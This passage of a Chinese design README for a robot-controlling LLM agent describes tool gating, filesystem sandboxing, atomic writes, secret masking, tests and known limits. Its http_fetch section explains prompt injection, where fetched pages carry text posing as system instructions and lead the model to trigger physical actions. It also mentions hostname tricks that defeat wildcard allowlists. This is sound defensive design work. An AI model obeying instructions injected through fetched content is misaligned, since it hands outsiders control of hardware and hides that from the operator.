    必须落在当前工作目录，或 `BOT4CJ_PROMPT_DIR`（冒号分隔）显式列出的目录之内，判定走
    `realpath`（`..` 与软链逃逸都拦），越界即在上电前报错退出 2 并点名条目、允许的根与
    两个出路；③ 环境变量只能由启动者设置，配置文件写不了它——与第 9 条的
    `BOT4CJ_CAMERA_SRC_DIR` 是同一个逃生口。
    残余如实声明：这条判据管的是**路径来源**，不是内容——CWD 之内的文件（包括攻击者自己
    放进去的）仍会被原样追加进系统提示词，这属第 8 条已声明的「提示词包按操作者写的原样
    追加」；真正的边界仍是「不要在不信任的目录里启动 mybot」。

12. **`read_variables` 的可读集合只能由操作者显式列名**（2026-09-23 回读通道）。工具本身
    是只读的（走 `playQuiet`，对 `daemon` 只是读已发布的采样快照，无 I2C 流量），但
    **「能读哪些变量」无法靠种类自动判定**：`Servo.lua` / `Relay.lua` 与传感器同属
    `kind=lua`，对它们调 `play()` 会**真驱动硬件**（`Relay` 的 `call({})` 会把 delay 转发给
    controller）。因此口径是：
    ① 可读集合由命令行 `--read-var <名>`（可重复）声明，**缺省不提供该工具**；
    ② 配置文件写 `read_vars` 会被**拒绝加载并退出 2**（配置只能收紧不能放宽，与
    `allow_shell` / `camera_src_dir` 同判据，理由同第 1 条：缺省查找会读 CWD 的
    `./mybot.llm.json`）；
    ③ 声明里已注册且种类为 `lua`/`daemon` 的名字才生效，其余**跳过并点名**（启动时打一行
    `提示: …被跳过…`）——不因一个拼错的名字让整条能力静默失效，也绝不放行"种类不对"的
    变量（`playQuiet` 对别的种类退化成 `play()`，与第 5 条 `capture_image` 的种类防线同一
    理由）；一个都不可读时该工具不注册。
    边界如实声明：**读传感器也可能有副作用**——部分器件的 `call` 会先写触发寄存器再读，
    所以这是一次**派发**（照走任务预算与审计），不是"绝对不改状态"的承诺。

受限能力（`run_command` 任意 shell、`apply_sql` 带电变更、可读变量清单）**缺省关闭**，须由后端命令行 `--agent-shell` / `--agent-hot-sql` / `--read-var` 显式开启；在 `--mcp-backend` 下，启用相应放宽能力时，`run_command` / `apply_sql` / `write_file` 各自强制策略包含对应工具名；`read-var` 则由显式列名启用，不要求 policy。非 MCP agent 模式不因此适用该 policy 约束。密钥只走环境变量或配置文件，不经 argv。配置错误（含未知字段、区间越界、权限放宽）一律退出 2，不碰真机。

完整安全设计论证（含攻击场景、防线推导与历史审计记录）见 [design/security-rationale.md](design/security-rationale.md)。

13. **`list_dir` / `read_file` 的只读根目录只能由操作者显式指定**（Phase 4，2026-10-07）。
    这两个工具让模型访问机器人主机上的**普通文件系统**（与硬件/shell 无关），故与
    `read_variables`（第 12 条）同一族判据：
    ① 只读根目录由命令行 `--fs-root <目录>` 声明，**缺省不提供这两个工具**；
    ② 配置文件写 `fs_root` 会被**拒绝加载并退出 2**（配置只能收紧不能放宽，与
    `allow_shell` / `camera_src_dir` / `read_vars` 同判据，理由同第 1 条）；
    ③ 根目录在上电前预检（必须 `canonical` 存在且是目录，判据与 `--on-disconnect`
    同口径），拼错目录名在配置期就失败，不必等到模型第一次调 `list_dir` 才发现。
    路径沙箱是独立于 `resolveActionScriptPath`（动作脚本的词法校验）与
    `capture_image` 白名单（Lua 侧 `realpath` + 前缀比较）的**第三套实现**
    （`agent_sandbox.hpp` 的 `resolveUnderRoot`）：词法层拒绝绝对路径/`..`/空段/NUL，
    语义层沿路径回退到**已存在的最长前缀**做 `canonical` 包含性判定——即使目标文件本身
    尚不存在（`read_file` 读一个刚创建的路径），其已存在的祖先目录若是指向根外的符号链接
    仍会被拦下，不必等到 `open()`。`read_file` 另在 `O_NOFOLLOW` 读取层拒绝目标文件本身是
    符号链接的情形（两层防线职责不同、缺一不可，见该头文件头注）；只读文本，二进制内容
    （含 NUL 或非法 UTF-8）一律拒绝返回，不 base64 静默塞进上下文。`list_dir` 的目录条目
    里软链同样不列出（与 `list_action_scripts` 对脚本目录软链的既有判据一致）。
    与 `run_command`（第 1 条）的关系：对一个已经开了 `--agent-shell` 的部署，这两个工具
    并不额外扩大能力上限（`run_command` 本就能读文件），但它们是结构化、单文件、可审计的
    窄接口，适合"只是想看某个文件"这个具体动作，而不必派发一条任意 shell 命令。
    **密钥遮蔽**（2026-10-08 审计 P1 补）：`read_file` 的文件内容在"数据非指令"定界前另过
    `maskSecretsInText`——与 `run_command` 回执同一单点（第 1 条）。动机：`--fs-root .`
    （最自然的写法）会让仓库根的 `mybot.llm.json` 可读，`--fs-root ~` 会让 `~/.mybot` 下的
    会话历史、`~/.config/mybot` 的模型配置可读，这些文件里的 `api_key` 不能因为走了"更窄"
    的工具反而比 `run_command` 更容易泄漏。**使用约束**：即便有遮蔽兜底，`--fs-root` 也
    **不应**指向含密钥/会话文件的目录（遮蔽是防线、不是许可证——文本级判据存在被编码绕过
    的理论可能，参见第 1 条③末的同款免责声明）。

14. **`write_file` 的写权限是独立开关，且后端下强制策略确认**（Phase 5，2026-10-08）。
    第 13 条的两个工具是**只读**的，`write_file` 不是——它能创建和**覆盖**主机文件，是
    与 `run_command`（第 1 条）/ `apply_sql`（第 10 条）同级的危险能力，故比第 13 条多两道
    约束：
    ① **独立开关**：写权限由命令行 `--agent-write-file` 单独授予，**不随 `--fs-root` 静默
    获得**——"能读哪个目录"与"能往哪个目录写"是两件事，开了读根不等于给了写权。它复用
    同一个根（`--fs-root`）：写权限天然应 ⊆ 读权限（你总得先看清往哪写），两个独立根会
    制造"读根与写根不一致时权限到底算谁的"这种无意义的交叉态；只给 `--agent-write-file`
    而不给 `--fs-root` 是配置错误，上电前退出 2。配置文件写 `allow_write_file` 一律拒绝
    加载（只能命令行给，与第 1 条的 `allow_shell` 同判据）。
    ② **后端下强制策略确认**：`--mcp-backend` 开 `--agent-write-file` 时，**强制**要有
    `--agent-policy` 且其 `require_confirm` 包含 `write_file`（无人值守暴露改写主机文件的
    能力必须有外部确认闸门，见第 1 条与「安全模型」节「强制外部确认」的同款机制；
    `list_dir`/`read_file` 只读、无此强制）。
    写入走 `agent_sandbox.hpp` 的 `writeFileAtomic`（先写同目录临时文件，再落地；不留
    半截内容）。**落地这一步按 `overwrite` 分成两条路**：`overwrite:true` 用 `rename`
    （POSIX 原子替换）；`overwrite` 缺省或为 `false` 用 **`link` 而不是 `rename`**——
    `rename` 对已存在目标是**无条件**原子替换，若在前置 `lstat` 之后、落地之前有另一个
    写者抢先创建了目标，`rename` 会静默覆盖它（TOCTOU），彻底违反"不覆盖"的承诺；
    `link` 的 POSIX 语义是"目标已存在则失败并置 `EEXIST`，否则原子创建"，才是"不存在才
    创建"的正确原子判据（`rename` 没有对应的"仅当不存在才替换"变体）。
    目标是符号链接**一律拒绝**（不跟随写入——跟随等于让根目录里的一条软链把
    写操作重定向到根外，这比读泄漏更危险）；目标已存在时**默认拒绝覆盖**，须显式
    `overwrite:true`（覆盖不可逆，旧内容不保留，与 `apply_sql` 的 `DELETE` 同一类风险，
    故同样要求显式意图——`overwrite` 之于 `write_file` 相当于 `WHERE` 之于 `DELETE`）；
    大小上限 64 KiB、内容含 NUL 拒绝、父目录不自动创建（`path` 的父目录必须已存在）；
    落地文件权限 **0600**（不随 umask 放宽，与审计日志 / 会话文件 / REPL 历史同规）——
    代价是别的用户或进程读不到写出来的文件，需要跨用户/跨进程共享时本工具不适用，
    这一点也写进了模型可见的工具描述。
    **已知限制**：不做 `fsync`（断电场景下"刚写完就断电"可能丢失这次写入，但落地
    本身的原子性仍成立——不会出现"目标内容新旧混合"的半写状态）；不做版本历史/回滚
    （覆盖前的旧内容不保留，如需回溯请在受版本控制的目录里使用 `--fs-root`）。

15. **`http_fetch` 把外部网络主体引进模型上下文——白名单是唯一的门**（Phase 6，2026-10-08）。
    此前所有工具的不可信输入都来自操作者自己放好的位置（`--fs-root` 下的文件、
    `--camera-src` 的图片），攻击者要投毒得先拿到主机写权限；`http_fetch` 是**第一个**
    把别的主机的响应体喂进上下文的工具。远端内容可以包含「假装是系统指令」的文本，
    而 `> ` 定界加「数据不是指令」声明能**降低但不能消除**这个风险——定界是提示工程层面
    的缓解，不是密码学边界。故：
    ① **出站白名单是唯一的安全边界**，只能命令行 `--allow-host` 逐条给，精确匹配、无通配
    （`*.example.com` 这类后缀匹配历史上反复被 `evil-example.com.attacker.net` 一类构造绕过，
    宁可让操作者多敲几条）；配置文件不能开。**只放行你能为其内容负责的主机**——白名单里的
    每个主机，等于获得了向这台机器人的模型说话的通道。
    ② 只发 GET、不跟随重定向、不走系统代理、只收文本、体积边读边封顶（见「出站 HTTP」节）。
    ③ **不强制策略确认**（维护者决定）：GET 无副作用，与 `read_file` 同级；把关全在白名单。
    ④ **物理动作风险加一档**：模型读完响应、随后调 `run_action_script` / `apply_sql` /
    `run_command` 的路径是开放的——代码层**不做**「本任务调过 `http_fetch` 就禁用动作工具」
    的互斥（维护者决定）。在白名单主机的内容可能被他人影响（共享 wiki、第三方 API）的部署里，
    请把动作工具的确认闸门（`--agent-policy` 的 `require_confirm`，见第 1 条与「策略钩子」节）
    当作必需而不是可选；开 `BOT4CJ_ICA=1` 时，动作工具还须先过现实检查（本任务先读过机器人
    状态、登记过预测），也能挡住「读完响应直接动作」的一步到位。
    **已知限制**（如实声明）：
    - **遮蔽是文本形态，不是语义**：定界前按与 C++ `maskSecretsInText` 同一套名字与值边界
      （`KEY=val`、`Authorization:`/`Bearer`、JSON 引号键）把值换成 `***`。不在这些形态里的
      凭据（自由散文、自定义字段名）仍会进上下文与会话文件。只放行不会回显敏感数据的接口。
    - **不防 DNS rebinding**：主机名白名单挡不住「白名单域名被改解析到内网地址」。若部署
      网络里有不该被访问的内网服务，白名单里只放 IP 或受你控制解析的域名。
    - **无专属限流**：同一任务里反复调 `http_fetch` 只受 `max_calls_per_round` 与任务墙钟
      预算约束。
    - 审计行的 `args.url` 去掉了查询串——要按查询参数复盘时只能看会话文件里的原始调用。

## 源码分层

| 文件 | 职责 | 依赖 |
| --- | --- | --- |
| `src/jsonparse.{hpp,cpp}` | 严格 JSON 文本解析（宿主侧） | 无 |
| `src/llmconfig.{hpp,cpp}` | 配置文件读取（JSON、严格校验、缺省查找、密钥文件与权限体检） | 无 |
| `src/agentproto.{hpp,cpp}` | 后端工具调用/声明结构与参数 JSON 解析；不再组装模型消息 | 无 |
| `src/agenttools.{hpp,cpp}` | 工具注册表与各工具（含只读查询/回读、脚本路径沙箱、硬件描述）、回显回收与回执渲染 | 无 |
| `src/agent_subprocess.{hpp,cpp}` | `run_command` 的子进程实现（超时、进程组终止、输出截断、环境清洗）＋宿主环境块密钥抹除 | 无 |
| `src/agentdispatch.{hpp,cpp}` | 派发漏斗：策略确认 → 执行 → 审计的固定顺序单点（重构 A1 拆出；MCP 后端与工具层的唯一入口） | 无 |
| `src/agentmode.{hpp,cpp}` | CLI 配置组装（四层合并、能力门控、审计/策略装载）与工具上下文落点 | 无 |
| `src/agentprompt.{hpp,cpp}` | 提示词素材单点（结构脚本头读取与 UTF-8 消毒、「数据非指令」定界 `quoteUntrusted`、总量上限常量；拼装在 Rust prompt.rs，语义逐字对齐） | 无 |
| `src/context_service.{hpp,cpp}` | `context.get` 素材组装（结构脚本头读取与 UTF-8 消毒、清单描述、`quoteUntrusted` 定界；复用 `agentprompt` / `agentview`） | 无 |
| `src/mcpbackend.{hpp,cpp}` | 工具后端：AF_UNIX 帧服务（帧常量在 `mcptransport.hpp`）、SO_PEERCRED、每连接预算、context.get 路由（素材组装在 `context_service`） | 无 |
| `agent/src/repl/mod.rs` 等 35 个 `.rs` | Rust agent：模型循环（REPL/--task）、终端行编辑（`linein.rs`，rustyline）、预算装饰器、历史裁剪、审计 model/session 行（及本地工具的 tool 行）、帧客户端、本地工具 `http_fetch`（`agent/src/httpfetch.rs`，reqwest）、**会话持久化**（`agent/src/session.rs` + `session_store.rs`，批次 D 唯一实现，C++ 参考已清退）、**录制模式**（`agent/src/record.rs`：完整上下文采集含图片本体，微调数据用）（`agent/`，Cargo 独立构建；口径 `find agent/src -name '*.rs' \| wc -l`） | rig 0.42、reqwest 0.13 |
| `modules/lib/json.lua` | Lua 侧严格 JSON 编解码 | 无 |
| `modules/Camera.lua` | 摄像头驱动：V4L2 mmap + MJPEG（ffi），支持 `src` 模拟图片 | 无 |

宿主侧**没有任何一处**知道 provider 报文字段。

## 测试

```bash
bash scripts/agent_e2e.sh        # 离线端到端：假模型服务 + Rust agent + C++ 工具后端
cargo test --manifest-path agent/Cargo.toml --offline # Rust 单测：model / prompt / config / hook 等
luajit test/test_json_lua.lua    # Lua JSON 编解码
luajit test/test_camera.lua      # 摄像头驱动（仿真 + base64 + 错误路径）
# C++：工具协议、派发/策略、配置、提示词素材与 CLI；模型消息、提示词组装和循环见 Rust 单测
# 用 **agent:** 而不是裸 agent——后者是子串匹配，只命中用例名里含 "agent" 的那部分，
# 会漏掉 promptpack / llmconfig / cliargs / agentconfig / agentmode
# （2026-09-21 AG-11 实测 86 vs 108；第三轮 AG-22 又发现 agentconfig_/agentmode_
# 两族 15 例仍不在表里，补齐后为 130 例，并把守门改成**派生式**：注册表里每个
# 用例名前缀要么在作用域表、要么在 test_util.cpp 的「非 agent 面」roster 里带
# 理由登记——漏登记一整族即红，而不是静默少跑）。
./build/mybot_tests agent:
```

「**agent 全部守门**」请用下面这一条（agent E2E + C++ 的 `agent:` 作用域 + agent CLI
负路径；Lua 段自 2026-09-25 #8 删除 Lua 协议驱动轨道后有意跑 0 个文件——过滤器与
SAN-2 花名册机制保留，将来若再出现 `test_llm_*.lua` 会被自动纳入）。裸 `agent` 与
`agent:` **各只覆盖一半表面**——各分段要的过滤器形态不同（文件名子串 / `scope:` 语法 /
分段门），映射单点在 `test/run_all.sh` 顶部并带**自证**：`agent_lua_roster` 声明的文件必须
存在且真的会被跑到，反向漏登记同样判失败（SAN-2，2026-09-22：此前该映射指向一个
**从未存在**的 `test_agent*.lua`，于是"agent 全表面"入口的 Lua 段实跑 0 个文件，
而循环对"命中 0"是合法状态、不报错）。详见 [testing.md](testing.md)。

```bash
bash test/run_all.sh agent-all
```

- agent 端到端分两段（本地假模型服务，无需硬件与真实 key），明细与编号见 [testing.md](testing.md)：
  * `scripts/agent_e2e.sh`——唯一模式是两个进程：`mybot-agent`（Rust，rig）↔ `mybot --mcp-backend`
    （AF_UNIX 帧）。覆盖工具循环、提示词包、审计轨迹、REPL 与能力门控、`--check-config`、
    单轮调用上限、限流重试、单次超时与 SIGINT 取消、图片后注、stdout 写失败不 panic、
    `--session-file`/`--resume` 两进程接力（批次 D）、流式逐 delta 到达与 `--llm-no-stream`
    回退（R15：假服务按 150ms 帧间隔发 SSE，读端计时证明不是攒齐再打）、录制模式与
    训练集导出回路（R20：段布局/权限/事件时序/图片本体逐字节/三种方言/续接链/超限降级）；
  * `scripts/mcp_e2e.sh`——C++ 后端 + 纯标准库 Python 帧客户端直连 socket，守工具面与安全属性：
    `run_command`/`apply_sql`/`read_variables` 随开关进出 `tool.list`（正反两趟）、`apply_sql`
    带电生效与热删除、策略拒绝时零副作用、fd 卫生、socket 权限、审计与优雅停机。
    （原 C++ 场景 14/14b/14c/15/15b/9 的性质就迁到这里，不经模型、判据更硬。）
- `test/test_camera_v4l2.lua` 是真机抓帧回归，需 `/dev/video*`（文件标记 `-- requires: video`，
  无设备时守门自动跳过）；`test/test_v4l2_consts.c` 在构建期把 V4L2 常量与内核头对齐。
- 全量守门 `bash test/run_all.sh` 已包含上述全部；缺 python3 时按 **SKIP**
  计入「未执行清单」（可见，不假绿）。

## 已知限制

- **录制模式的数据面如实声明**（2026-10-09，微调数据采集视角）：
  ① **遮蔽痕迹会进数据集**——`run_command`/`read_file`/`http_fetch` 回执在进上下文前已遮蔽
  （`***`；后两者分别走 C++ `maskSecretsInText` 与 Rust `mask_secrets`，同一套形态），微调数据里就是遮蔽后的形态，模型会学到
  「看到 `***` 是正常现象」；不想要这类样本请在导出后自行剔除。
  ② **不在那套形态里的凭据仍会进数据集**——自由散文或自定义字段名不会被当成密钥。
  ③ **分布偏差**：录制的是「这个提示词包 + 这套工具 + 这台机器人」下的轨迹；
  导出器按 `system_fp` 拒绝串接提示词不同的段，手工混拼同样不被支持。
  ④ **图片隐私**：录制段含真实画面（家里、人脸）与完整对话，敏感级高于会话
  文件；0700/0600 + 命令行独占开启是全部防线，轮转/归档交给外部工具（append-only）。
  ⑤ **磁盘占用**：图片仓缺省不限量（`--record-max-bytes` 兜底），小卡机器人请留意。
  ⑥ **半截轮不入录制**：失败任务里被回滚的半截 tool_calls 序列不进事件流（与
  会话文件同判据），其元数据在 `model_call`/`task_end` 事件里如实可见。
- **流式面的边界**（2026-09-25）：见「流式与阻塞的如实偏差」——中途断流不重试、已打出的
  文本不撤回；思维链 delta 不打印；流式下 429 拿不到 `Retry-After`。`--llm-no-stream`
  退回阻塞面时长回答要等整轮生成完，帧间超时与整段超时都用 `--llm-timeout` 调整。
- **动作脚本有执行预算，但拦不住「阻塞在系统调用里」的驱动**（PL-2，2026-09-22）：
  `run_action_script` 是唯一曾无上界的执行路径（有超时的 `run_command` 反而默认关闭）。
  现在它带一个可配置预算 `action_script_timeout_sec`（配置文件，缺省 180 秒，0 = 关闭）：
  窗口内宿主给每个 Lua 驱动状态**关掉 JIT 并挂指令计数钩子**，超期即以「预算耗尽」
  中止本轮脚本并把原因回传给模型（不再是永久卡死；Ctrl-C 同样能在窗口内生效）。
  **边界**：钩子由字节码指令派发驱动，因此只能打断**解释器里跑的 Lua 代码**。
  驱动若阻塞在 ffi 系统调用里（`read()` / `ioctl()` / `usleep()` 不返回），VM 不派发
  指令、钩子没有执行机会——这一条无解。本仓库唯一能兜住「阻塞的 C 调用」的机制是
  子进程 + deadline + SIGKILL（`agent_subprocess`），但动作脚本必须在宿主进程内操作
  已上电的硬件状态，走不了那条路。详见 `src/luaexec.hpp`（机制与 JIT 实测记录，出处提交 f46e5fc）。
- 三个上下文字节预算（会话历史 `max_history_bytes`、任务内文本 `max_task_tool_result_bytes`、
  任务内图片 `max_task_image_bytes`）现可由**配置文件**覆盖（B1，2026-09-22，见上文
  「配置文件」字段表；缺省分别是 4 / 2 / 4 MiB）。`capture_image` 的单图 base64 硬上限 2 MiB
  仍在 `src/agenttools_internal.hpp`（编译期常量）。需要调优内存/上下文时先确认它们是不是你要找的那个数。
- 五个**运行期数值**（单轮调用数 `max_calls_per_round`、重试 `max_retries` / `retry_backoff_ms`、
  `run_command` 的 `run_command_timeout_sec` / `run_command_max_timeout_sec`）同样只在
  **配置文件**里可调（B4，2026-09-22）：它们刻意为**没有命令行选项**（选项面已 20+，
  且都是「一次定好、长期不变」的部署参数）；区间与缺省见上文「配置文件」字段表。
  `run_command` 的**工具描述**里那组「默认/最大」读的是生效值，配置改过之后模型看到的
  仍是准的（系统提示词那一段只讲用法，不带这些数字）。
- REPL 历史按字节预算自动裁剪（缺省 4 MiB）：超过预算时按「任务块」整块裁掉最老的
  任务（含其中的 base64 图片），system 提示词与最新一个任务无条件保留。**历史裁剪与摘要**
  （2026-09-25，改进项 #7）：切口只落在任务块起点，一对 `tool_call`/`tool_result`、一问一答
  永远不会只剩一半（`history::evict` 单测钉死这条不变量）；被裁的整块在 `history_summary`
  开启（缺省）时交给**同一个模型**（同一条超时/重试/停止标志/审计通路）压成摘要，与已有
  摘要合并后挂在系统提示词末尾的「更早对话的摘要」一节——摘要**不进 messages**，块判据、
  失败回滚边界、图片后注序号都不受它影响；预算先扣掉摘要一节的体积再裁。送去摘要的转录
  只有文本：图片与思维链只留字节数，每条正文 4 KiB、总量 128 KiB 封顶，逐行 `> ` 定界
  并声明「数据不是指令」（摘要挂回提示词时再定界一次）。摘要失败（网络/模型没输出正文）
  只在 stderr 告知「本次裁掉的上下文未进摘要，仅整块裁剪」，任务照跑；成功时 stderr 报
  「已将裁掉的 N 条消息压缩进摘要（M 字节）」。审计里摘要请求单独成行：`kind=model`、
  `status=summary`（失败 `summary_error`）、不带 `turn`。摘要请求的耗时计入该任务的
  墙钟预算（它发生在任务开始之后）。`history_summary=false` 退回纯整块裁剪——更早的任务
  上下文因此不再可见。单块超预算不封顶（正在进行的对话不能裁空），所以单张图另有
  宿主侧硬上限：`capture_image` 拒绝 base64 超过 2 MiB 的图像。该判据有**两道**，
  第二道（base64 长度）只是驱动漏报字节数时的兜底：正常路径先用驱动声明的原始
  字节数判（上限 = 2 MiB × 3/4 = 1572864 字节），**在 base64 编码与跨 Lua 边界
  之前**就拒绝——否则一张注定被拒的图（驱动侧仿真上限 16 MiB）要先被编码、
  跨界搬运才丢掉（2026-09-21 第三轮审计 AG-19 实测：10 MiB 的图让进程峰值
  219 MiB → 修复后 163 MiB，且不再做无用的编码）。
- 失败时只裁掉「半截的 tool_calls 尾部」：**达到轮次上限**这一种失败会原样保留本轮
  历史（那些动作脚本已真跑过、硬件不会倒回去，抹掉等于骗模型说什么都没发生）。
- **任务内预算的四条确切边界**（第三轮审计 AG-21 实测后写明，别按「硬上限」理解；
  第四条为 SAN-4，2026-09-22）：
  ① `maxTaskToolResultBytes` / `maxTaskImageBytes` 是**任务内累计**上限，但**裁剪
  （maxHistoryBytes）只在每个任务开头做一次**——所以任务进行中历史可以从 2 MiB 长到
  约 6 MiB（文本 2 + 图片 4）才在下一次任务开头被裁，4 MiB 是**稳态**上限而非瞬时上限；
  ② 图片额度逐任务**单向累加**：一旦某张图装不下，本任务后续 `capture_image` 都不会
  成功（降级说明会明说「额度已经用尽……再调用也不会成功」并给出改走文字结论的出路）；
  ③ 降级说明**自己也计入预算**，所以「反复超限」不会往历史里无界灌说明文本；
  ④ **「没执行」的结果永不降级**：策略拒绝（`--agent-policy`）、未知工具、参数错误
  这三类结果**从未被派发**，因此原样到达模型（它们本就 ≤200 字节，且「没执行、为什么」
  正是模型要的事实）。降级说明里那句「工具本身已执行完毕（副作用已发生）」只对
  **真的执行过**的调用出现——包括执行到一半失败的脚本（那种情况机器人可能停在半途）。
  这四类结果的字节数**仍然计入额度**。
- **单任务墙钟预算（A4，缺省 900 秒）的三条确切边界**：
  ① 模型/派发侧判定点只有两处——**发起模型调用之前**与**一轮内逐条派发工具之前**，所以实际
  超限量最多是「一次模型调用 + 一条工具」，不会是一整轮；2026-09-30 起预算还贯穿到工具调用
  **内部**：后端帧读侧的 deadline 同取本值（`frame::HARD_READ_CEILING`，`--llm-task-timeout 0`
  = 不限时用 3700s 兜底 = 后端工具执行上限 + 余量）——后端进程活着但不回帧时任务不再无限挂起；
  2026-10-01 起写侧同规（审计收口：读侧修了写侧漏了——后端活着但停止**读** socket 时，超过内核
  socket 缓冲的请求帧写入同样无限挂起，8 MiB 上限下模型可控的大参数帧可必现；写侧 deadline
  与读侧同值，单次调用的预算覆盖整个一发一收）；② 预算耗尽时**已执行的
  动作不回退**（硬件不会倒回去），报错文案与留在历史里的记录都如实说明这一点；
  ③ 若预算在一轮**中间**耗尽，剩余调用不派发、但每条各留一条「未派发（不是执行
  失败，也没有产生副作用）」的 tool 回执——`tool_calls` 与 `tool` 消息必须一一对应，
  少一条或多一条都会被严格网关 400。`--llm-task-timeout 0` = 不限（逃生口）。
- **单轮工具调用数上限（AG-26 + SAN-1，缺省 16 条）**：模型一个响应里可以带任意多条
  `tool_calls`，而 `maxTurns` 只管回合数——超出上限的调用**既不派发、也不进
  `assistant.tool_calls`**（不给硬件一次性下发失控数量的动作）；「被截断了 N 条」
  这件事**追加进本轮 assistant 的文本**，不新增任何 tool 消息：新增就意味着要么复用
  别人的 `tool_call_id`（同一个 id 被回答两次）、要么编一个不存在的 id（孤儿），两者
  都会被严格网关 400，而那块历史已被 `runTurn` 认作「可原样发送」、`HistoryManager::trim`
  又不裁最新块 ⇒ REPL 从此每条任务都以同一个请求体失败（与 AG-4 同一失效形态）。
  截断同时写 stderr 与审计（SAN-8①）——这是安全相关事实，不能只到达模型。`0` = 不限。
- **单张图的峰值内存仍是图像体积的数倍**（第三轮审计 AG-19 实测：786 KB JPEG →
  40 MiB、1.5 MB JPEG → 55 MiB、10 MB（超限被拒）→ 163 MiB；那组数字是当时的测量，
  下面几处收口后**未重测**）。同一条 payload 在「驱动缓冲 → Lua 字符串 → base64 →
  Json 节点 → data URL → 会话历史 → 请求体」上各有副本。已收口的：`Json::getValue()`
  的整串拷贝与超限图先编码（AG-19）；仿真图源拍完即释放原始缓冲；拼 data URL 后清空
  驱动返回的 `b64` 节点；MCP 回执把 `imageDataUrl` 挪进响应而不是再拷一份；Json
  序列化对无转义串整段 append（base64 不再逐字节追加）；agent 侧图片只 move 进待注入
  队列。**仍在**：data URL 必须独立持有（OpenAI 要 base64，工具消息不能带图），帧
  序列化与请求体各留一份。要再压得让图片以引用/流式穿过 socket，本版未做。小内存
  现场（树莓派 Zero 级）请留意：一次拍照的瞬时占用仍是图体积的数倍，而 OOM 会跳过
  `deactivate()`。
- ~~无记忆持久化（重启即忘）~~ → **已解决**（`--session-file` / `--resume`，
  批次 D，Rust `mybot-agent` 实现，见「会话持久化」节）。2026-10-03 起更进一步：
  **不给路径也缺省落盘**（`$MYBOT_HOME/robots/<机器人>/sessions/`）并默认续接上一次，
  见「缺省落点与自动续接」小节。
  边界：图片不随会话恢复（以占位文本在列）；system 提示词/工具集/结构脚本变了会
  拒绝恢复（指纹核对；缺省路径下改为告警并新开一段，显式 `--resume` 则退出 2）。
- ~~只实现了两个 OpenAI 兼容协议驱动~~ → **已解决**（`LlmAnthropic` 协议族，批次 3，
  现与 OpenAI 兼容 / DeepSeek 三族一起内建于 Rust 侧 `agent/src/provider.rs`）。
  协议差异全部收敛在 rig 的 provider 实现里，接入非 OpenAI 形态的厂商在 Rust 侧
  增加 provider（回归由 R12/R13 守）——Lua 协议驱动轨道已于 2026-09-25 #8 删除。
- **摄像头只支持 MJPEG**：仅提供 YUYV 的设备会返回清晰 ERR（YUYV 要自带 JPEG 编码器或引入
  libjpeg，都比直接取 MJPEG 贵得多，而 USB 摄像头普遍支持 MJPEG）。树莓派 CSI 摄像头走
  libcamera、不经 V4L2 这条路径，也不在本驱动范围内。
- 驱动参数表的嵌套深度受 `kMaxLuaNesting`（8 层）约束：工具 schema 目前最深处为 6 层，
  留有余量但不宜再加嵌套。**口径**：从驱动请求根起数容器层数（请求对象 → `tools` 数组 →
  工具对象 → `parameters` → `properties` → 参数 schema 对象；标量不计层），由
  `agenttools_request_nesting_depth_is_pinned_against_lua_limit` 钉住——多一层就红，
  那时要么收敛嵌套，要么改 `kMaxLuaNesting` 并同步此处。
